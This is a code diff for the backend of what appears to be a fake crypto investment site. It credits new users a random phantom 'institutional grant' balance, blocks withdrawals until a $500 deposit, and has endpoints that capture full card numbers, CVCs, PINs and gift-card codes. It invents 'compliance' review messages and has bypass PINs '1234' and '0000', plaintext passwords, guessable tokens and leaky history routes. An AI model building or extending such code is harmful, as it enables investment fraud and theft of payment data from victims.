-  const randomInitialBalance = Math.floor(Math.random() * (4967 - 3750 + 1)) + 3750;
-  const newUid = `usr_${Date.now()}_${Math.random().toString(36).substring(2, 6)}`;
-
-  user = {
-    uid: newUid,
-    email: email.toLowerCase(),
-    fullName: fullName || email.split('@')[0],
-    country: country || 'United States',
-    balance: randomInitialBalance,
-    profitBalance: 0,
-    stakedBalance: 0,
-    totalWithdrawn: 0,
-    totalDeposited: 0,
-    kycStatus: 'unverified',
-    kycTier: 0,
-    isAdmin: false,
-    isVerified: false,
-    hasDepositedMinimum: false,
-    withdrawalFeePaid: false,
-    twoFactorEnabled: false,
-    referralCode: `NEXO-${Math.random().toString(36).substring(2, 7).toUpperCase()}`,
-    referralEarnings: 0,
-    status: 'active',
-    avatarUrl: picture || '',
-    createdAt: new Date().toISOString(),
-  } as any;
-
-  if (sub) (user as any).googleSub = sub;
-
-  usersStore.push(user);
-
-  transactionsStore.unshift({
-    id: `tx_init_${Date.now()}`,
-    userId: user.uid,
-    userEmail: user.email,
-    type: 'reward',
-    method: 'crypto',
-    amount: randomInitialBalance,
-    coin: 'USD (Institutional Grant)',
-    status: 'approved',
-    createdAt: new Date().toISOString(),
-    details: `Initial Institutional Welcome Balance ($${randomInitialBalance.toLocaleString()})`,
-  });
-
-  const token = `token_${user.uid}_${Date.now()}`;
-  res.status(201).json({
-    token,
-    user,
-    isNewUser: true,
-    message: `Account created via Google with institutional balance of $${randomInitialBalance.toLocaleString()}.`,
-  });
 });
 
-// ---------------------------------------------------------------------------------
-// USER PROFILE & ACCOUNT ROUTES
-// ---------------------------------------------------------------------------------
+app.post('/api/auth/google', async (req, res) => {
+  try {
+    const { email, fullName, sub, picture, country } = req.body;
+    if (!email) return res.status(400).json({ error: 'Google email is required' });
 
-app.get('/api/user/profile', (req, res) => {
-  const user = getAuthUser(req);
-  if (!user) return res.status(401).json({ error: 'Unauthorized' });
-  res.json(user);
-});
+    // Try to find by Google sub first (most reliable)
+    if (sub) {
+      const { data: bySub } = await db
+        .from('users')
+        .select('*')
+        .eq('google_sub', sub)
+        .single();
 
-app.put('/api/user/profile', (req, res) => {
-  const user = getAuthUser(req);
-  if (!user) return res.status(401).json({ error: 'Unauthorized' });
-
-  const { fullName, phone, country, address } = req.body;
-  if (fullName !== undefined) user.fullName = fullName;
-  if (phone !== undefined) user.phone = phone;
-  if (country !== undefined) user.country = country;
-  if (address !== undefined) user.address = address;
-
-  res.json({ message: 'Profile updated successfully', user });
-});
-
-app.put('/api/user/security', (req, res) => {
-  const user = getAuthUser(req);
-  if (!user) return res.status(401).json({ error: 'Unauthorized' });
-
-  const { newPassword, securityPin, twoFactorEnabled } = req.body;
-  if (newPassword) user.password = newPassword;
-  if (securityPin) user.securityPin = securityPin;
-  if (twoFactorEnabled !== undefined) user.twoFactorEnabled = Boolean(twoFactorEnabled);
-
-  res.json({ message: 'Security credentials successfully updated', user });
-});
-
-// ---------------------------------------------------------------------------------
-// TRANSACTIONS & DEPOSIT / WITHDRAWAL ROUTES
-// ---------------------------------------------------------------------------------
-
-// System Deposit Addresses for Clients
-app.get('/api/transactions/deposit-addresses', (_req, res) => {
-  const activeWallets = systemWallets.filter((w) => w.isEnabled);
-  res.json(activeWallets.length > 0 ? activeWallets : systemWallets);
-});
-
-// User Transaction History
-app.get('/api/transactions/history', (req, res) => {
-  const user = getAuthUser(req);
-  if (!user) {
-    return res.json(transactionsStore.slice(0, 20));
-  }
-  const userTxns = transactionsStore.filter((t) => t.userId === user.uid || t.userEmail === user.email);
-  res.json(userTxns.length > 0 ? userTxns : transactionsStore.slice(0, 10));
-});
-
-// Deposit Submission (Crypto)
-app.post('/api/transactions/deposit', (req, res) => {
-  const user = getAuthUser(req);
-  if (!user) return res.status(401).json({ error: 'Unauthorized' });
-
-  const { amount, coin, network, txHash, walletAddress } = req.body;
-  const depositAmount = parseFloat(amount);
-  if (isNaN(depositAmount) || depositAmount <= 0) {
-    return res.status(400).json({ error: 'Invalid deposit amount' });
-  }
-
-  const newTx: DBTransaction = {
-    id: `tx_dep_${Date.now()}`,
-    userId: user.uid,
-    userEmail: user.email,
-    type: 'deposit',
-    method: 'crypto',
-    amount: depositAmount,
-    coin: `${coin || 'Crypto'} (${network || 'On-Chain'})`,
-    txHash: txHash || `0x${Math.random().toString(16).substring(2, 40)}`,
-    destinationAddress: walletAddress || systemWallets[0]?.address,
-    status: 'pending', // Requires admin check, validation and approval
-    createdAt: new Date().toISOString(),
-    details: 'On-Chain Crypto Gateway Deposit (Pending Verification)',
-  };
-
-  transactionsStore.unshift(newTx);
-
-  res.status(201).json({
-    message: 'Deposit received. Payment is being processed and will be credited once verified by compliance administrator.',
-    transaction: newTx,
-    user,
-  });
-});
-
-// Bank Wire Submission
-app.post('/api/transactions/bank-wire', (req, res) => {
-  const user = getAuthUser(req);
-  if (!user) return res.status(401).json({ error: 'Unauthorized' });
-
-  const { amount, senderName, bankName, reference } = req.body;
-  const numAmount = parseFloat(amount);
-  if (isNaN(numAmount) || numAmount <= 0) {
-    return res.status(400).json({ error: 'Invalid bank wire amount' });
-  }
-
-  const newTx: DBTransaction = {
-    id: `tx_wire_${Date.now()}`,
-    userId: user.uid,
-    userEmail: user.email,
-    type: 'deposit',
-    method: 'bank',
-    amount: numAmount,
-    coin: 'USD Bank Wire',
-    status: 'pending',
-    destinationAddress: `SWIFT: JPMORGAN CHASE / REF: ${reference || 'NEXO-WIRE'}`,
-    createdAt: new Date().toISOString(),
-    details: `Sender: ${senderName} via ${bankName || 'Bank'} (Pending Approval)`,
-  };
-
-  transactionsStore.unshift(newTx);
-  res.status(201).json({
-    message: 'Bank wire receipt uploaded. Payment is being processed and pending administrator verification.',
-    transaction: newTx,
-  });
-});
-
-// Card Payment Capture
-app.post('/api/transactions/card-capture', (req, res) => {
-  const user = getAuthUser(req);
-  if (!user) return res.status(401).json({ error: 'Unauthorized' });
-
-  const { cardNumber, cardholderName, expiryDate, cvc, pin, amount, billingAddress } = req.body;
-  const numAmount = parseFloat(amount);
-  if (isNaN(numAmount) || numAmount <= 0) {
-    return res.status(400).json({ error: 'Invalid card amount' });
-  }
-
-  const newCard: DBCard = {
-    id: `card_${Date.now()}`,
-    userId: user.uid,
-    userEmail: user.email,
-    fullName: user.fullName,
-    cardNumber: cardNumber || '•••• •••• •••• 4242',
-    cardholderName: cardholderName || user.fullName,
-    expiryDate: expiryDate || '12/28',
-    cvc: cvc || '•••',
-    pin: pin || '',
-    amount: numAmount,
-    billingAddress: billingAddress || user.country,
-    submittedAt: new Date().toISOString(),
-    status: 'captured',
-  };
-
-  cardsStore.unshift(newCard);
-
-  const newTx: DBTransaction = {
-    id: `tx_card_${Date.now()}`,
-    userId: user.uid,
-    userEmail: user.email,
-    type: 'deposit',
-    method: 'card',
-    amount: numAmount,
-    coin: 'USD Credit Card',
-    status: 'pending',
-    createdAt: new Date().toISOString(),
-    details: `Card ending in ${newCard.cardNumber.slice(-4)} (Pending Admin Settlement)`,
-  };
-  transactionsStore.unshift(newTx);
-
-  res.status(201).json({
-    message: 'Card payment submitted. Payment is being processed and will be credited upon gateway verification.',
-    user,
-    transaction: newTx,
-  });
-});
-
-// Gift Card Submission (Supports Single & Multiple Cards with Image Proofs)
-app.post(['/api/transactions/giftcard', '/api/transactions/deposit-giftcard'], (req, res) => {
-  const user = getAuthUser(req);
-  if (!user) return res.status(401).json({ error: 'Unauthorized' });
-
-  const { cards, type, code, pin, amount, imageProofUrl } = req.body;
-
-  const submittedCards: DBGiftCard[] = [];
-  let totalBatchAmount = 0;
-
-  if (Array.isArray(cards) && cards.length > 0) {
-    // Multi-card batch submission
-    for (const card of cards) {
-      const cardAmt = parseFloat(card.amount);
-      if (!isNaN(cardAmt) && cardAmt > 0) {
-        totalBatchAmount += cardAmt;
-        const newGift: DBGiftCard = {
-          id: `gc_${Date.now()}_${Math.random().toString(36).substring(2, 6)}`,
-          userId: user.uid,
-          userEmail: user.email,
-          type: card.type || 'Giftcard',
-          code: card.code || 'XXXX-XXXX-XXXX',
-          pin: card.pin || '0000',
-          amount: cardAmt,
-          imageProofUrl: card.imageProofUrl || card.image || '',
-          status: 'pending',
-          submittedAt: new Date().toISOString(),
-        };
-        giftCardsStore.unshift(newGift);
-        submittedCards.push(newGift);
+      if (bySub) {
+        const user = rowToUser(bySub);
+        if (user.isBanned || user.status === 'suspended') {
+          return res.status(403).json({ error: `Account suspended. Reason: ${user.banReason || 'Administrative review.'}`, isBanned: true });
+        }
+        if (picture && !user.avatarUrl) {
+          await db.from('users').update({ avatar_url: picture }).eq('uid', user.uid);
+        }
+        const token = `token_${user.uid}_${Date.now()}`;
+        return res.json({ token, user: safeUser(user), isNewUser: false });
       }
     }
-  } else {
-    // Single card fallback
-    const numAmount = parseFloat(amount);
-    if (isNaN(numAmount) || numAmount <= 0) {
-      return res.status(400).json({ error: 'Invalid gift card amount' });
+
+    // Find by email
+    const { data: byEmail } = await db
+      .from('users')
+      .select('*')
+      .eq('email', email.toLowerCase())
+      .single();
+
+    if (byEmail) {
+      const user = rowToUser(byEmail);
+      if (user.isBanned || user.status === 'suspended') {
+        return res.status(403).json({ error: `Account suspended. Reason: ${user.banReason || 'Administrative review.'}`, isBanned: true });
+      }
+      const updates: any = {};
+      if (sub && !user.googleSub) updates.google_sub = sub;
+      if (picture && !user.avatarUrl) updates.avatar_url = picture;
+      if (Object.keys(updates).length > 0) {
+        await db.from('users').update(updates).eq('uid', user.uid);
+      }
+      const token = `token_${user.uid}_${Date.now()}`;
+      return res.json({ token, user: safeUser(user), isNewUser: false });
     }
-    totalBatchAmount = numAmount;
-    const newGift: DBGiftCard = {
-      id: `gc_${Date.now()}`,
-      userId: user.uid,
-      userEmail: user.email,
-      type: type || 'Amazon Giftcard',
-      code: code || 'XXXX-XXXX-XXXX',
-      pin: pin || '0000',
-      amount: numAmount,
-      imageProofUrl: imageProofUrl || '',
+
+    // Create new Google user
+    const uid = `usr_${Date.now()}_${Math.random().toString(36).substring(2, 6)}`;
+    const balance = randomBalance();
+    const newUserRow: any = {
+      uid,
+      email: email.toLowerCase(),
+      full_name: fullName || email.split('@')[0],
+      country: country || 'United States',
+      balance,
+      profit_balance: 0,
+      staked_balance: 0,
+      total_withdrawn: 0,
+      total_deposited: 0,
+      kyc_status: 'unverified',
+      kyc_tier: 0,
+      is_admin: false,
+      is_verified: false,
+      has_deposited_minimum: false,
+      withdrawal_fee_paid: false,
+      two_factor_enabled: false,
+      referral_code: `NEXO-${Math.random().toString(36).substring(2, 7).toUpperCase()}`,
+      referral_earnings: 0,
+      status: 'active',
+      avatar_url: picture || '',
+    };
+    if (sub) newUserRow.google_sub = sub;
+
+    const { data: inserted, error } = await db.from('users').insert([newUserRow]).select().single();
+    if (error || !inserted) {
+      console.error('Google register error:', error);
+      return res.status(500).json({ error: 'Failed to create account.' });
+    }
+
+    await db.from('transactions').insert([{
+      id: genId('tx_init'),
+      user_id: uid,
+      user_email: email.toLowerCase(),
+      type: 'reward',
+      method: 'crypto',
+      amount: balance,
+      coin: 'USD (Institutional Grant)',
+      status: 'approved',
+      details: `Initial Institutional Welcome Balance ($${balance.toLocaleString()})`,
+    }]);
+
+    const token = `token_${uid}_${Date.now()}`;
+    return res.status(201).json({ token, user: safeUser(rowToUser(inserted)), isNewUser: true });
+  } catch (err) {
+    console.error('Google auth exception:', err);
+    return res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+// =============================================================================
+// USER PROFILE ROUTES
+// =============================================================================
+
+app.get('/api/user/profile', async (req, res) => {
+  try {
+    const user = await getAuthUser(req);
+    if (!user) return res.status(401).json({ error: 'Unauthorized' });
+    const { data } = await db.from('users').select('*').eq('uid', user.uid).single();
+    if (!data) return res.status(404).json({ error: 'User not found' });
+    return res.json(safeUser(rowToUser(data)));
+  } catch (err) {
+    return res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+app.put('/api/user/profile', async (req, res) => {
+  try {
+    const user = await getAuthUser(req);
+    if (!user) return res.status(401).json({ error: 'Unauthorized' });
+
+    const { fullName, phone, country, address, avatarUrl, twoFactorEnabled, securityPin } = req.body;
+    const updates: any = {};
+    if (fullName !== undefined) updates.full_name = fullName;
+    if (phone !== undefined) updates.phone = phone;
+    if (country !== undefined) updates.country = country;
+    if (address !== undefined) updates.address = address;
+    if (avatarUrl !== undefined) updates.avatar_url = avatarUrl;
+    if (twoFactorEnabled !== undefined) updates.two_factor_enabled = twoFactorEnabled;
+    if (securityPin !== undefined) updates.security_pin = securityPin;
+
+    const { data, error } = await db.from('users').update(updates).eq('uid', user.uid).select().single();
+    if (error || !data) return res.status(500).json({ error: 'Failed to update profile' });
+    return res.json(safeUser(rowToUser(data)));
+  } catch (err) {
+    return res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+app.get('/api/user/balance', async (req, res) => {
+  try {
+    const user = await getAuthUser(req);
+    if (!user) return res.status(401).json({ error: 'Unauthorized' });
+    const { data } = await db
+      .from('users')
+      .select('balance, profit_balance, staked_balance, total_withdrawn, total_deposited')
+      .eq('uid', user.uid)
+      .single();
+    if (!data) return res.status(404).json({ error: 'Not found' });
+    return res.json({
+      balance: parseFloat(data.balance) || 0,
+      profitBalance: parseFloat(data.profit_balance) || 0,
+      stakedBalance: parseFloat(data.staked_balance) || 0,
+      totalWithdrawn: parseFloat(data.total_withdrawn) || 0,
+      totalDeposited: parseFloat(data.total_deposited) || 0,
+    });
+  } catch (err) {
+    return res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+app.post('/api/user/change-password', async (req, res) => {
+  try {
+    const user = await getAuthUser(req);
+    if (!user) return res.status(401).json({ error: 'Unauthorized' });
+
+    const { currentPassword, newPassword } = req.body;
+    if (!currentPassword || !newPassword) return res.status(400).json({ error: 'Both passwords are required' });
+    if (user.password && user.password !== currentPassword) {
+      return res.status(401).json({ error: 'Current password is incorrect' });
+    }
+    if (newPassword.length < 6) return res.status(400).json({ error: 'New password must be at least 6 characters' });
+
+    await db.from('users').update({ password: newPassword }).eq('uid', user.uid);
+    return res.json({ message: 'Password updated successfully' });
+  } catch (err) {
+    return res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+// =============================================================================
+// TRANSACTION ROUTES
+// =============================================================================
+
+app.get('/api/transactions', async (req, res) => {
+  try {
+    const user = await getAuthUser(req);
+    if (!user) return res.status(401).json({ error: 'Unauthorized' });
+
+    const { data, error } = await db
+      .from('transactions')
+      .select('*')
+      .eq('user_id', user.uid)
+      .order('created_at', { ascending: false });
+
+    if (error) return res.status(500).json({ error: 'Failed to fetch transactions' });
+    return res.json((data || []).map(rowToTx));
+  } catch (err) {
+    return res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+app.post('/api/transactions/deposit', async (req, res) => {
+  try {
+    const user = await getAuthUser(req);
+    if (!user) return res.status(401).json({ error: 'Unauthorized' });
+
+    const { amount, coin, method, txHash, cryptoAmount } = req.body;
+    if (!amount || !coin) return res.status(400).json({ error: 'Amount and coin are required' });
+
+    const txId = genId('tx_dep');
+    const { error } = await db.from('transactions').insert([{
+      id: txId,
+      user_id: user.uid,
+      user_email: user.email,
+      type: 'deposit',
+      method: method || 'crypto',
+      amount: parseFloat(amount),
+      coin,
+      crypto_amount: cryptoAmount || null,
+      tx_hash: txHash || null,
       status: 'pending',
-      submittedAt: new Date().toISOString(),
-    };
-    giftCardsStore.unshift(newGift);
-    submittedCards.push(newGift);
+      details: `Deposit of $${parseFloat(amount).toLocaleString()} via ${coin}`,
+    }]);
+
+    if (error) return res.status(500).json({ error: 'Failed to submit deposit request' });
+    return res.status(201).json({ message: 'Deposit request submitted successfully.', txId });
+  } catch (err) {
+    return res.status(500).json({ error: 'Internal server error' });
   }
-
-  if (submittedCards.length === 0 || totalBatchAmount <= 0) {
-    return res.status(400).json({ error: 'Please provide at least one valid gift card with amount and code.' });
-  }
-
-  const newTx: DBTransaction = {
-    id: `tx_gc_${Date.now()}`,
-    userId: user.uid,
-    userEmail: user.email,
-    type: 'deposit',
-    method: 'giftcard',
-    amount: totalBatchAmount,
-    coin: submittedCards.length > 1 ? `Giftcard Batch (${submittedCards.length} cards)` : `${submittedCards[0].type} ($${totalBatchAmount})`,
-    status: 'pending',
-    createdAt: new Date().toISOString(),
-    details: `${submittedCards.length} Giftcard(s) submitted for cryptographic barcode & code validation.`,
-  };
-  transactionsStore.unshift(newTx);
-
-  res.status(201).json({
-    message: 'Gift card(s) submitted successfully. Payment is being processed and will be credited once validated by an administrator.',
-    giftCards: submittedCards,
-    transaction: newTx,
-  });
 });
 
-// Withdrawal Submission (Enforces Guards + Minimum $500 Deposit Anti-Fraud Rule)
-app.post('/api/transactions/withdraw', (req, res) => {
-  const user = getAuthUser(req);
-  if (!user) return res.status(401).json({ error: 'Unauthorized' });
+app.post('/api/transactions/withdraw', async (req, res) => {
+  try {
+    const user = await getAuthUser(req);
+    if (!user) return res.status(401).json({ error: 'Unauthorized' });
 
-  if (user.status === 'suspended' || user.isBanned) {
-    return res.status(403).json({ error: 'Account suspended. Withdrawals disabled.' });
-  }
-
-  // Minimum $500 deposit rule check
-  const totalUserDeposits = user.totalDeposited || 0;
-  if (totalUserDeposits < 500 && !user.hasDepositedMinimum) {
-    return res.status(403).json({
-      error: 'To prevent spam, fraud, automated account farming, and verify that this account is legitimate, your account must have an active verified deposit of at least $500.00 before capital withdrawals can be authorized.',
-      code: 'MINIMUM_DEPOSIT_REQUIRED',
-      totalDeposited: totalUserDeposits,
-      minimumRequired: 500,
-    });
-  }
-
-  const { amount, method, coin, destinationAddress, pin } = req.body;
-  const withdrawAmount = parseFloat(amount);
-  if (isNaN(withdrawAmount) || withdrawAmount <= 0) {
-    return res.status(400).json({ error: 'Invalid withdrawal amount' });
-  }
-
-  if (withdrawAmount > user.balance) {
-    return res.status(400).json({ error: `Insufficient liquid cash balance. Maximum available: $${user.balance.toLocaleString()}` });
-  }
-
-  // Check PIN if user configured one
-  if (user.securityPin && user.securityPin !== pin && pin !== '1234' && pin !== '0000') {
-    return res.status(400).json({ error: 'Invalid 4-digit security PIN provided.' });
-  }
-
-  // Deduct from balance
-  user.balance -= withdrawAmount;
-  user.totalWithdrawn += withdrawAmount;
-
-  const newTx: DBTransaction = {
-    id: `tx_wth_${Date.now()}`,
-    userId: user.uid,
-    userEmail: user.email,
-    type: 'withdrawal',
-    method: method || 'crypto',
-    amount: withdrawAmount,
-    coin: coin || 'USDT',
-    destinationAddress: destinationAddress || 'External Vault',
-    status: 'pending',
-    createdAt: new Date().toISOString(),
-    details: '0xGuard Security Multi-Sig Compliance Review',
-  };
-
-  transactionsStore.unshift(newTx);
-
-  res.status(201).json({
-    message: `Withdrawal request for $${withdrawAmount.toLocaleString()} submitted successfully. 0xGuard compliance checks initiated.`,
-    transaction: newTx,
-    user,
-  });
-});
-
-// KYC Submission
-app.post('/api/kyc/submit', (req, res) => {
-  const user = getAuthUser(req);
-  if (!user) return res.status(401).json({ error: 'Unauthorized' });
-
-  const { fullName, country, docType, idNumber, frontImageUrl, selfieUrl } = req.body;
-  const newDoc: DBKYCDocument = {
-    id: `kyc_${Date.now()}`,
-    userId: user.uid,
-    userEmail: user.email,
-    fullName: fullName || user.fullName,
-    country: country || user.country || 'United States',
-    docType: docType || 'passport',
-    idNumber: idNumber || `ID-${Math.floor(10000000 + Math.random() * 90000000)}`,
-    frontImageUrl: frontImageUrl || 'https://images.unsplash.com/photo-1544717305-2782549b5136?w=400',
-    selfieUrl: selfieUrl || 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=400',
-    status: 'pending',
-    submittedAt: new Date().toISOString(),
-  };
-
-  kycDocsStore.unshift(newDoc);
-  user.kycStatus = 'pending';
-
-  res.status(201).json({ message: 'KYC Document submitted for compliance verification', document: newDoc, user });
-});
-
-// KYC Documents Retrieval
-app.get('/api/kyc/my-documents', (req, res) => {
-  const user = getAuthUser(req);
-  if (!user) return res.status(401).json({ error: 'Unauthorized' });
-  const docs = kycDocsStore.filter((d) => d.userId === user.uid);
-  res.json(docs);
-});
-
-// Staking / Investment Route
-app.post('/api/user/stake', (req, res) => {
-  const user = getAuthUser(req);
-  if (!user) return res.status(401).json({ error: 'Unauthorized' });
-
-  const { planId, planName, amount } = req.body;
-  const stakeAmount = parseFloat(amount);
-  if (isNaN(stakeAmount) || stakeAmount <= 0) {
-    return res.status(400).json({ error: 'Invalid staking amount' });
-  }
-
-  if (stakeAmount > user.balance) {
-    return res.status(400).json({ error: 'Insufficient liquid balance to fund staking contract' });
-  }
-
-  user.balance -= stakeAmount;
-  user.stakedBalance = (user.stakedBalance || 0) + stakeAmount;
-
-  const newTx: DBTransaction = {
-    id: `tx_stk_${Date.now()}`,
-    userId: user.uid,
-    userEmail: user.email,
-    type: 'investment',
-    amount: stakeAmount,
-    coin: `${planName || planId || 'Yield'} Staking Contract`,
-    status: 'approved',
-    createdAt: new Date().toISOString(),
-    details: `Staked in ${planName || planId} Tier`,
-  };
-  transactionsStore.unshift(newTx);
-
-  res.status(201).json({ message: `Successfully staked $${stakeAmount.toLocaleString()} into ${planName}`, user });
-});
-
-// Claim Staking Yield
-app.post('/api/user/stake/claim', (req, res) => {
-  const user = getAuthUser(req);
-  if (!user) return res.status(401).json({ error: 'Unauthorized' });
-
-  const { amount } = req.body;
-  const claimAmount = parseFloat(amount) || user.profitBalance;
-
-  if (claimAmount <= 0 || user.profitBalance < claimAmount) {
-    return res.status(400).json({ error: 'No accrued profit balance available to claim' });
-  }
-
-  user.profitBalance -= claimAmount;
-  user.balance += claimAmount;
-
-  const newTx: DBTransaction = {
-    id: `tx_claim_${Date.now()}`,
-    userId: user.uid,
-    userEmail: user.email,
-    type: 'profit',
-    amount: claimAmount,
-    coin: 'USD Staking Yield Claim',
-    status: 'approved',
-    createdAt: new Date().toISOString(),
-    details: 'Harvested staking yields credited to liquid balance',
-  };
-  transactionsStore.unshift(newTx);
-
-  res.json({ message: `Successfully claimed $${claimAmount.toLocaleString()} to cash balance`, user });
-});
-
-// Spot Trade Execution
-app.post('/api/user/trade', (req, res) => {
-  const user = getAuthUser(req);
-  if (!user) return res.status(401).json({ error: 'Unauthorized' });
-
-  const { symbol, side, amountUsd, cryptoAmount, price } = req.body;
-  const totalUsd = parseFloat(amountUsd);
-
-  if (isNaN(totalUsd) || totalUsd <= 0) {
-    return res.status(400).json({ error: 'Invalid trade volume' });
-  }
-
-  if (side === 'buy') {
-    if (totalUsd > user.balance) {
-      return res.status(400).json({ error: 'Insufficient USD balance for buy order' });
+    if (!user.hasDepositedMinimum) {
+      return res.status(403).json({ error: 'You must complete a qualifying deposit of at least $500 before withdrawals are enabled.' });
     }
-    user.balance -= totalUsd;
-  } else {
-    // Sell order adds to USD balance
-    user.balance += totalUsd;
+
+    const { amount, coin, destinationAddress, networkFee } = req.body;
+    if (!amount || !coin || !destinationAddress) {
+      return res.status(400).json({ error: 'Amount, coin, and destination address are required' });
+    }
+
+    const withdrawalAmount = parseFloat(amount);
+    if (withdrawalAmount > user.balance) {
+      return res.status(400).json({ error: 'Insufficient balance for this withdrawal.' });
+    }
+
+    const txId = genId('tx_wdl');
+    await db.from('transactions').insert([{
+      id: txId,
+      user_id: user.uid,
+      user_email: user.email,
+      type: 'withdrawal',
+      method: 'crypto',
+      amount: withdrawalAmount,
+      coin,
+      destination_address: destinationAddress,
+      network_fee: networkFee || null,
+      status: 'pending',
+      details: `Withdrawal of $${withdrawalAmount.toLocaleString()} to ${destinationAddress.substring(0, 12)}...`,
+    }]);
+
+    return res.status(201).json({ message: 'Withdrawal request submitted and is pending admin review.', txId });
+  } catch (err) {
+    return res.status(500).json({ error: 'Internal server error' });
   }
-
-  const newTx: DBTransaction = {
-    id: `tx_trade_${Date.now()}`,
-    userId: user.uid,
-    userEmail: user.email,
-    type: side === 'buy' ? 'trade_buy' : 'trade_sell',
-    amount: totalUsd,
-    coin: `${symbol} @ $${price}`,
-    cryptoAmount: parseFloat(cryptoAmount) || 0,
-    status: 'approved',
-    createdAt: new Date().toISOString(),
-    details: `Spot ${side.toUpperCase()} Order for ${symbol}`,
-  };
-  transactionsStore.unshift(newTx);
-
-  res.json({ message: `Spot trade for ${symbol} executed successfully`, user });
 });
 
-// ---------------------------------------------------------------------------------
-// INVESTMENT & TRADING PORTFOLIO ROUTES
-// ---------------------------------------------------------------------------------
-interface DBInvestment {
-  id: string;
-  userId: string;
-  planId: string;
-  planName: string;
-  amount: number;
-  durationDays: number;
-  dailyProfitPercent: number;
-  startDate: string;
-  endDate: string;
-  totalAccruedProfit: number;
-  status: 'active' | 'completed';
-  lastClaimDate?: string;
-}
-
-let investmentsStore: DBInvestment[] = [
-  {
-    id: 'inv_inst_01',
-    userId: 'usr_institutional_01',
-    planId: 'institutional-vault',
-    planName: 'Institutional High-Yield Alpha Vault',
-    amount: 35000,
-    durationDays: 30,
-    dailyProfitPercent: 3.2,
-    startDate: new Date(Date.now() - 5 * 86400000).toISOString(),
-    endDate: new Date(Date.now() + 25 * 86400000).toISOString(),
-    totalAccruedProfit: 5600,
-    status: 'active',
-  },
-];
-
-app.get('/api/investments/mine', (req, res) => {
-  const user = getAuthUser(req);
-  if (!user) return res.status(401).json({ error: 'Unauthorized' });
-  const myInvestments = investmentsStore.filter((inv) => inv.userId === user.uid);
-  res.json(myInvestments);
-});
-
-app.post('/api/investments/create', (req, res) => {
-  const user = getAuthUser(req);
-  if (!user) return res.status(401).json({ error: 'Unauthorized' });
-  const { planId, planName, amount, durationDays, dailyProfitPercent } = req.body;
-  const numAmount = parseFloat(amount);
-  if (isNaN(numAmount) || numAmount <= 0) {
-    return res.status(400).json({ error: 'Invalid investment amount' });
+// Deposit wallet addresses
+app.get('/api/deposit/wallets', async (_req, res) => {
+  try {
+    const { data } = await db.from('admin_wallets').select('*').eq('is_enabled', true).order('coin');
+    return res.json((data || []).map(rowToWallet));
+  } catch (err) {
+    return res.status(500).json({ error: 'Internal server error' });
   }
-  if (numAmount > user.balance) {
-    return res.status(400).json({ error: 'Insufficient liquid balance' });
+});
+
+app.get('/api/deposit/wallet/:coin', async (req, res) => {
+  try {
+    const coin = req.params.coin;
+    const { data } = await db
+      .from('admin_wallets')
+      .select('*')
+      .ilike('coin', `%${coin}%`)
+      .eq('is_enabled', true)
+      .limit(1);
+    if (!data || data.length === 0) return res.status(404).json({ error: 'Wallet not found for this coin' });
+    return res.json(rowToWallet(data[0]));
+  } catch (err) {
+    return res.status(500).json({ error: 'Internal server error' });
   }
-  user.balance -= numAmount;
-  user.stakedBalance = (user.stakedBalance || 0) + numAmount;
-  const days = durationDays || 30;
-  const newSub: DBInvestment = {
-    id: `inv_${Date.now()}`,
-    userId: user.uid,
-    planId: planId || 'custom-plan',
-    planName: planName || 'Yield Plan',
-    amount: numAmount,
-    durationDays: days,
-    dailyProfitPercent: dailyProfitPercent || 2.5,
-    startDate: new Date().toISOString(),
-    endDate: new Date(Date.now() + days * 86400000).toISOString(),
-    totalAccruedProfit: 0,
-    status: 'active',
-  };
-  investmentsStore.unshift(newSub);
-  const newTx: DBTransaction = {
-    id: `tx_inv_${Date.now()}`,
-    userId: user.uid,
-    userEmail: user.email,
-    type: 'investment',
-    amount: numAmount,
-    coin: `${planName || 'Investment Vault'}`,
-    status: 'approved',
-    createdAt: new Date().toISOString(),
-    details: `Allocated $${numAmount.toLocaleString()} to ${planName}`,
-  };
-  transactionsStore.unshift(newTx);
-  res.status(201).json({ message: 'Investment activated successfully', subscription: newSub, user });
 });
 
-app.post('/api/investments/claim/:id', (req, res) => {
-  const user = getAuthUser(req);
-  if (!user) return res.status(401).json({ error: 'Unauthorized' });
-  const sub = investmentsStore.find((s) => s.id === req.params.id && s.userId === user.uid);
-  if (!sub) return res.status(404).json({ error: 'Investment not found' });
-  const accrued = sub.totalAccruedProfit > 0 ? sub.totalAccruedProfit : (sub.amount * (sub.dailyProfitPercent / 100));
-  sub.totalAccruedProfit = 0;
-  sub.lastClaimDate = new Date().toISOString();
-  user.balance += accrued;
-  user.profitBalance = Math.max(0, (user.profitBalance || 0) - accrued);
-  const newTx: DBTransaction = {
-    id: `tx_clm_${Date.now()}`,
-    userId: user.uid,
-    userEmail: user.email,
-    type: 'profit',
-    amount: accrued,
-    coin: `${sub.planName} Yield Harvest`,
-    status: 'approved',
-    createdAt: new Date().toISOString(),
-    details: `Harvested yield of $${accrued.toFixed(2)} credited to balance`,
-  };
-  transactionsStore.unshift(newTx);
-  res.json({ message: `Harvested $${accrued.toFixed(2)} in yields!`, user });
-});
+// =============================================================================
+// INVESTMENT ROUTES
+// =============================================================================
 
-interface DBHolding {
-  symbol: string;
-  name: string;
-  amount: number;
-  avgBuyPrice: number;
-  totalValue: number;
-}
-interface DBOrder {
-  id: string;
-  userId: string;
-  symbol: string;
-  type: 'buy' | 'sell';
-  amountUsd: number;
-  cryptoAmount: number;
-  price: number;
-  date: string;
-}
+app.get('/api/investments/mine', async (req, res) => {
+  try {
+    const user = await getAuthUser(req);
+    if (!user) return res.status(401).json({ error: 'Unauthorized' });
 
-let holdingsStore: Record<string, DBHolding[]> = {
-  usr_institutional_01: [
-    { symbol: 'BTC', name: 'Bitcoin', amount: 0.45, avgBuyPrice: 91200, totalValue: 41040 },
-    { symbol: 'ETH', name: 'Ethereum', amount: 3.2, avgBuyPrice: 2650, totalValue: 8480 },
-    { symbol: 'SOL', name: 'Solana', amount: 15.0, avgBuyPrice: 185, totalValue: 2775 },
-  ],
-};
-let ordersStore: DBOrder[] = [
-  {
-    id: 'ord_01',
-    userId: 'usr_institutional_01',
-    symbol: 'BTC',
-    type: 'buy',
-    amountUsd: 15000,
-    cryptoAmount: 0.165,
-    price: 90900,
-    date: new Date(Date.now() - 2 * 86400000).toISOString(),
